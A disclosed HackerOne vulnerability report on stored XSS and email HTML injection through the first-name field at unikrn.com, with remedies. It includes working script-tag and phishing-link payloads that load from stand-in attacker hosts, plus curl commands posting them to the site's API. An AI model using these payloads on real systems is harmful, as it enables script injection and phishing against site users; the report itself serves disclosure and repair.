# HTML injection in email in unikrn.com

## Report Details
- **Report ID**: 262004
- **URL**: https://hackerone.com/reports/262004
- **State**: Closed
- **Severity**: high
- **Submitted**: 2017-08-21T16:32:04.749Z
- **Disclosed**: 2017-08-23T08:21:40.908Z

## Reporter
- **Username**: coreyd97
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: unikrn

## Vulnerability Information
> NOTE! Thanks for submitting a report! Please replace *all* the [square] sections below with the pertinent details. Remember, the more detail you provide, the easier it is for us to verify and then potentially issue a bounty, so be sure to take your time filling out the report! **Please add the affected domain name in the Title of the report.**

**Summary:** Referral emails sent from unikrn.com are vulnerable to HTML injection via the first name field.

**Description:** Due to a lack of sanitization and validation when posting to https://unikrn.com/apiv2/user/verify a user may set a number of profile fields to values which should not be acceptable. This allows for a possible XSS within the raffle areas of the website and HTML injection within the referral email sent by unikrn.com.

The user may insert a payload into the firstname field which is later used to generate the users 'callsign'. The callsign value is safely used in other locations in the site within ng-bind attributes however in the case of viewing a raffle winner, the value is instead transformed by the 'vartrans' directive. This directive permits html to be inserted as part of the "raffle_winner_sidebar_body" text and is done so without any sanitization. 

Therefore should a user set their first name as '<script src=\"https://external.com/xss.js\" />' when the user wins a raffle, any visitor to that raffles page will result in the external script being loaded.

Alongside this XSS it was also found that should a user set their first name to a value containing a script tag, when a referral email is sent to an address, any email content after the script tag is ignored. As the field's maximum length is 256 characters, an attacker would have 248 characters to craft a malicious email or instead embed an image with the email content to allow for a larger word count. 

An example payload may be 
<a href=\"https://attacker/phish.php\"><img src=\"https://attacker/content.jpg\"></a><script>


Remedies for this would include proper sanitization of user fields when processed by the verify page and when passed as arguments to the vartrans directive to prevent similar issues in future, as well as a more strict content security policy and the stripping of all html characters when using user input within parameters to be used within an email.

## Steps To Reproduce:
## XSS:
  1. Use the provided curl command to set a users first name to an xss payload such as <script src=\"https://external2.com/xss.js\" />
  2. Win a raffle
  3. Visit the raffles page once you have been announced as a winner.
## Email HTML Injection:
 1. Use the provided curl command to set a users first name to a payload such as <a href=\"https://attacker/phish.php\"><img src=\"https://attacker/content.jpg\"></a><script>
2. Navigate to the profile page and send a referral email.

## Supporting Material/References:

XSS
* curl -i -s -k  -X $'POST' -H $'Content-Type: application/json' --data-binary $'{\"country\":\"GB\",\"firstname\":\"<script src=\\\"https://external2.com/xss.js\\\" />\", \"session_id\":\"SESSION_ID\"}'  $'https://unikrn.com/apiv2/user/verify'

Email HTML Injection
* curl -i -s -k  -X $'POST' -H $'Content-Type: application/json' --data-binary $'{\"country\":\"GB\",\"firstname\":\"<a href=\\\"https://attacker/phish.php\\\"><img src=\\\"https://attacker/content.jpg\\\"></a><script>\", \"session_id\":\"SESSION_ID\"}'  $'https://unikrn.com/apiv2/user/verify'




## Attachments
- Email_Content.png
